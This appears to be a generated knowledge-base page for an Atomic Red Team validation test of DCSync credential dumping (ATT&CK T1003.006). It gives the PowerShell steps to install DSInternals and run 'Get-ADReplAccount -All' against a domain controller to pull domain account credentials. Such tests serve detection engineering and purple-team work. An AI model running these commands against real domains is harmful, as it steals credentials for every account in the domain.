---
atomic_guid: "a0bced08-3fc5-4d8b-93b7-e8344739376e"
title: "Run DSInternals Get-ADReplAccount"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.006"
attack_technique_name: "OS Credential Dumping: DCSync"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.006/T1003.006.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "a0bced08-3fc5-4d8b-93b7-e8344739376e"
  - "Run DSInternals Get-ADReplAccount"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Run DSInternals Get-ADReplAccount

The following Atomic will run Get-ADReplAccount from DSInternals.
Upon successful execution, domain and credentials will appear in stdout. 
[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.
https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/

## Metadata

- Atomic GUID: a0bced08-3fc5-4d8b-93b7-e8344739376e
- Technique: T1003.006: OS Credential Dumping: DCSync
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1003.006/T1003.006.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.006]]

## Input Arguments

### logonserver

- description: ComputerName argument default %logonserver%
- type: string
- default: $ENV:logonserver.TrimStart("\")

## Dependencies

DSInternals must be installed

### Prerequisite Check

```powershell
$RequiredModule = Get-Module -Name DSInternals -ListAvailable
if (-not $RequiredModule) {exit 1} else {exit 0}
```

### Get Prerequisite

```powershell
Install-Module -Name DSInternals -Scope CurrentUser -Force
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
Get-ADReplAccount -All -Server #{logonserver}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.006/T1003.006.yaml)
